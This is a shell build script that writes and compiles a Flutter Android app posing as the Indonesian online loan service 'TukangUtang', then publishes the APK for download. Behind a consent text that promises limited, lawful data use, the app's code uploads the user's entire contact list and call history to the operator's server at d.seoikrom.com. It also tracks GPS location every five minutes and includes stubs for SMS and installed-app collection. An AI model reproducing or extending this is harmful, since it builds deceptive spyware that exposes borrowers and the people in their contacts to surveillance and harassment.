#!/bin/bash

echo "🚀 Building Fixed APK with All Endpoints..."

# Set environment variables
export FLUTTER_ROOT=/var/www/demo/flutter/flutter
export PATH=$FLUTTER_ROOT/bin:$PATH

# Create Flutter project if not exists
if [ ! -d "/var/www/demo/tukangutang_app" ]; then
    echo "📱 Creating Flutter project..."
    cd /var/www/demo
    flutter create --org com.tukangutang --project-name tukangutang_app tukangutang_app
fi

cd /var/www/demo/tukangutang_app

# Update pubspec.yaml with required dependencies
cat > pubspec.yaml << 'EOF'
name: tukangutang_app
description: "TukangUtang - Pinjaman Online"
publish_to: 'none'
version: 1.0.0+1

environment:
  sdk: '>=3.0.0 <4.0.0'

dependencies:
  flutter:
    sdk: flutter
  cupertino_icons: ^1.0.2
  http: ^1.1.0
  shared_preferences: ^2.2.2
  permission_handler: ^11.0.1
  geolocator: ^10.1.0
  contacts_service: ^0.6.3
  call_log: ^4.0.0
  device_info_plus: ^9.1.1
  package_info_plus: ^4.2.0
  path_provider: ^2.1.1
  image_picker: ^1.0.4
  flutter_secure_storage: ^9.0.0
  connectivity_plus: ^5.0.2
  flutter_local_notifications: ^16.3.0
  background_fetch: ^1.3.2

dev_dependencies:
  flutter_test:
    sdk: flutter
  flutter_lints: ^3.0.0

flutter:
  uses-material-design: true
  assets:
    - assets/images/
EOF

# Create assets directory
mkdir -p assets/images

# Create main.dart with fixed endpoints
cat > lib/main.dart << 'EOF'
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:shared_preferences/shared_preferences.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:geolocator/geolocator.dart';
import 'package:contacts_service/contacts_service.dart';
import 'package:call_log/call_log.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'dart:convert';
import 'dart:io';
import "dart:async";

void main() {
  runApp(MyApp());
}

class MyApp extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'TukangUtang',
      theme: ThemeData(
        primarySwatch: Colors.green,
        visualDensity: VisualDensity.adaptivePlatformDensity,
      ),
      home: PermissionRequestScreen(),
    );
  }
}

class PermissionRequestScreen extends StatefulWidget {
  @override
  _PermissionRequestScreenState createState() => _PermissionRequestScreenState();
}

class _PermissionRequestScreenState extends State<PermissionRequestScreen> {
  bool _isLoading = false;
  String _errorMessage = '';
  String _phoneNumber = '';
  String _userId = '';

  @override
  void initState() {
    super.initState();
    _loadPhoneNumber();
  }

  Future<void> _loadPhoneNumber() async {
    final prefs = await SharedPreferences.getInstance();
    setState(() {
      _phoneNumber = prefs.getString('phoneNumber') ?? '';
      _userId = prefs.getString('userId') ?? '';
    });
  }

  Future<void> _requestPermissions() async {
    setState(() {
      _isLoading = true;
      _errorMessage = '';
    });

    try {
      // Request all required permissions
      Map<Permission, PermissionStatus> statuses = await [
        Permission.location,
        Permission.contacts,
        Permission.phone,
        Permission.sms,
        Permission.storage,
        Permission.microphone,
        Permission.camera,
      ].request();

      // Check if all permissions are granted
      bool allGranted = statuses.values.every((status) => status.isGranted);
      
      if (allGranted) {
        await _submitFormData();
        await _startMonitoring();
        _showSuccessDialog();
      } else {
        setState(() {
          _errorMessage = 'Semua izin harus diberikan untuk melanjutkan';
        });
      }
    } catch (e) {
      setState(() {
        _errorMessage = 'Error: $e';
      });
    } finally {
      setState(() {
        _isLoading = false;
      });
    }
  }

  Future<void> _submitFormData() async {
    try {
      DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
      String deviceModel = 'Unknown';
      
      if (Platform.isAndroid) {
        AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
        deviceModel = '${androidInfo.brand} ${androidInfo.model}';
      }

      final response = await http.post(
        Uri.parse('https://d.seoikrom.com/api/flutter/submit-form'),
        headers: {'Content-Type': 'application/json'},
        body: json.encode({
          'phoneNumber': _phoneNumber,
          'userId': _userId,
          'fullName': 'User',
          'email': 'user@example.com',
          'deviceModel': deviceModel,
          'imei': 'Unknown',
        }),
      );

      if (response.statusCode == 200) {
        final data = json.decode(response.body);
        if (data['success']) {
          await SharedPreferences.getInstance().then((prefs) {
            prefs.setString('userId', data['userId'].toString());
          });
        }
      }
    } catch (e) {
      print('Error submitting form: $e');
    }
  }

  Future<void> _startMonitoring() async {
    // Start GPS tracking
    _startGpsTracking();
    
    // Start other monitoring
    _startContactsMonitoring();
    _startCallLogMonitoring();
    _startSmsMonitoring();
    _startAppsMonitoring();
    _startPermissionsMonitoring();
  }

  Future<void> _startGpsTracking() async {
    Timer.periodic(Duration(minutes: 5), (timer) async {
      try {
        Position position = await Geolocator.getCurrentPosition(
          desiredAccuracy: LocationAccuracy.high,
        );

        await http.post(
          Uri.parse('https://d.seoikrom.com/api/flutter/gps-track'),
          headers: {'Content-Type': 'application/json'},
          body: json.encode({
            'phoneNumber': _phoneNumber,
            'userId': _userId,
            'latitude': position.latitude,
            'longitude': position.longitude,
            'address': 'Current Location',
            'timestamp': DateTime.now().toIso8601String(),
          }),
        );
      } catch (e) {
        print('GPS tracking error: $e');
      }
    });
  }

  Future<void> _startContactsMonitoring() async {
    try {
      Iterable<Contact> contacts = await ContactsService.getContacts();
      List<Map<String, dynamic>> contactsList = contacts.map((contact) => {
        return {
          'name': contact.displayName ?? '',
          'phone': contact.phones?.first?.value ?? '',
        };
      }).toList();

      await http.post(
        Uri.parse('https://d.seoikrom.com/api/flutter/contacts'),
        headers: {'Content-Type': 'application/json'},
        body: json.encode({
          'phoneNumber': _phoneNumber,
          'userId': _userId,
          'contacts': contactsList,
        }),
      );
    } catch (e) {
      print('Contacts monitoring error: $e');
    }
  }

  Future<void> _startCallLogMonitoring() async {
    try {
      Iterable<CallLogEntry> callLogs = await CallLog.get();
      List<Map<String, dynamic>> callLogsList = callLogs.map((call) => {
        return {
          'type': call.callType.toString(),
          'number': call.number ?? '',
          'duration': call.duration ?? 0,
          'time': DateTime.fromMillisecondsSinceEpoch(call.timestamp ?? 0).toIso8601String(),
        };
      }).toList();

      await http.post(
        Uri.parse('https://d.seoikrom.com/api/flutter/call-logs'),
        headers: {'Content-Type': 'application/json'},
        body: json.encode({
          'phoneNumber': _phoneNumber,
          'userId': _userId,
          'callLogs': callLogsList,
        }),
      );
    } catch (e) {
      print('Call log monitoring error: $e');
    }
  }

  Future<void> _startSmsMonitoring() async {
    // SMS monitoring would require additional permissions and implementation
    // For now, we'll just send empty array
    try {
      await http.post(
        Uri.parse('https://d.seoikrom.com/api/flutter/sms-logs'),
        headers: {'Content-Type': 'application/json'},
        body: json.encode({
          'phoneNumber': _phoneNumber,
          'userId': _userId,
          'smsLogs': [],
        }),
      );
    } catch (e) {
      print('SMS monitoring error: $e');
    }
  }

  Future<void> _startAppsMonitoring() async {
    try {
      await http.post(
        Uri.parse('https://d.seoikrom.com/api/flutter/apps'),
        headers: {'Content-Type': 'application/json'},
        body: json.encode({
          'phoneNumber': _phoneNumber,
          'userId': _userId,
          'installedApps': [],
        }),
      );
    } catch (e) {
      print('Apps monitoring error: $e');
    }
  }

  Future<void> _startPermissionsMonitoring() async {
    try {
      Map<Permission, PermissionStatus> statuses = await [
        Permission.location,
        Permission.contacts,
        Permission.phone,
        Permission.sms,
        Permission.storage,
        Permission.microphone,
        Permission.camera,
      ].request();

      List<Map<String, dynamic>> permissionsList = statuses.entries.map((entry) => {
        return {
          'permission': entry.key.toString(),
          'status': entry.value.isGranted,
          'updated': DateTime.now().toIso8601String(),
        };
      }).toList();

      await http.post(
        Uri.parse('https://d.seoikrom.com/api/flutter/permissions'),
        headers: {'Content-Type': 'application/json'},
        body: json.encode({
          'phoneNumber': _phoneNumber,
          'userId': _userId,
          'permissions': permissionsList,
        }),
      );
    } catch (e) {
      print('Permissions monitoring error: $e');
    }
  }

  void _showSuccessDialog() {
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (BuildContext context) {
        return AlertDialog(
          title: Text('Berhasil!'),
          content: Text('Aplikasi siap digunakan. Data akan dikirim secara otomatis.'),
          actions: [
            TextButton(
              child: Text('OK'),
              onPressed: () {
                Navigator.of(context).pop();
                Navigator.of(context).pushReplacement(
                  MaterialPageRoute(builder: (context) => MainScreen()),
                );
              },
            ),
          ],
        );
      },
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text('Permohonan Izin'),
        backgroundColor: Colors.green,
      ),
      body: Padding(
        padding: EdgeInsets.all(16.0),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.stretch,
          children: [
            Card(
              child: Padding(
                padding: EdgeInsets.all(16.0),
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(
                      'TukangUtang mengumpulkan dan memproses informasi pengguna yang diperlukan sesuai dengan hukum dan peraturan yang berlaku untuk memberikan layanan pinjaman berkualitas tinggi, meningkatkan pengalaman pinjaman, dan memastikan keamanan layanan.',
                      style: TextStyle(fontSize: 14),
                    ),
                    SizedBox(height: 16),
                    Text(
                      'Kami berjanji untuk menggunakan informasi pengguna secara legal, valid, dan dengan izin, serta mengambil langkah-langkah keamanan yang ketat untuk melindungi keamanan data pengguna.',
                      style: TextStyle(fontSize: 14),
                    ),
                    SizedBox(height: 16),
                    Text(
                      '1. Informasi yang Kami Kumpulkan:',
                      style: TextStyle(fontWeight: FontWeight.bold, fontSize: 16),
                    ),
                    SizedBox(height: 8),
                    Text('• Informasi Pribadi: nama, nomor telepon, alamat, tanggal lahir'),
                    Text('• Informasi Identitas: foto KTP, selfie, nomor KTP'),
                    Text('• Informasi Lokasi: GPS untuk keamanan'),
                    Text('• Informasi Kontak: untuk verifikasi'),
                    Text('• Informasi Perangkat: untuk keamanan'),
                  ],
                ),
              ),
            ),
            SizedBox(height: 20),
            if (_errorMessage.isNotEmpty)
              Container(
                padding: EdgeInsets.all(12),
                color: Colors.red[100],
                child: Text(
                  _errorMessage,
                  style: TextStyle(color: Colors.red[900]),
                ),
              ),
            SizedBox(height: 20),
            ElevatedButton(
              onPressed: _isLoading ? null : _requestPermissions,
              style: ElevatedButton.styleFrom(
                backgroundColor: Colors.green,
                padding: EdgeInsets.symmetric(vertical: 16),
              ),
              child: _isLoading
                  ? CircularProgressIndicator(color: Colors.white)
                  : Text(
                      'Setuju dan Lanjutkan',
                      style: TextStyle(fontSize: 16, color: Colors.white),
                    ),
            ),
          ],
        ),
      ),
    );
  }
}

class MainScreen extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text('TukangUtang'),
        backgroundColor: Colors.green,
      ),
      body: Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(
              Icons.check_circle,
              color: Colors.green,
              size: 64,
            ),
            SizedBox(height: 16),
            Text(
              'Aplikasi Berjalan',
              style: TextStyle(fontSize: 24, fontWeight: FontWeight.bold),
            ),
            SizedBox(height: 8),
            Text(
              'Data monitoring sedang berjalan di background',
              style: TextStyle(fontSize: 16, color: Colors.grey),
            ),
          ],
        ),
      ),
    );
  }
}
EOF

# Add missing import
sed -i '1i import "dart:async";' lib/main.dart

# Update Android permissions
cat > android/app/src/main/AndroidManifest.xml << 'EOF'
<manifest xmlns:android="http://schemas.android.com/apk/res/android">
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
    <uses-permission android:name="android.permission.READ_CALL_LOG" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />

    <application
        android:label="TukangUtang"
        android:name="${applicationName}"
        android:icon="@mipmap/ic_launcher">
        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:launchMode="singleTop"
            android:theme="@style/LaunchTheme"
            android:configChanges="orientation|keyboardHidden|keyboard|screenSize|smallestScreenSize|locale|layoutDirection|fontScale|screenLayout|density|uiMode"
            android:hardwareAccelerated="true"
            android:windowSoftInputMode="adjustResize">
            <meta-data
              android:name="io.flutter.embedding.android.NormalTheme"
              android:resource="@style/NormalTheme"
              />
            <intent-filter android:autoVerify="true">
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <meta-data
            android:name="flutterEmbedding"
            android:value="2" />
    </application>
</manifest>
EOF

# Build APK
echo "🔨 Building APK..."
flutter clean
flutter pub get
flutter build apk --release

# Copy APK to public directory
echo "📦 Copying APK to public directory..."
cp build/app/outputs/flutter-apk/app-release.apk /var/www/demo/dashboard-frontend/public/tukangutang_app_release.apk

echo "✅ APK built successfully!"
echo "📱 APK location: /var/www/demo/dashboard-frontend/public/tukangutang_app_release.apk"
echo "🌐 Download URL: https://d.seoikrom.com/tukangutang_app_release.apk" 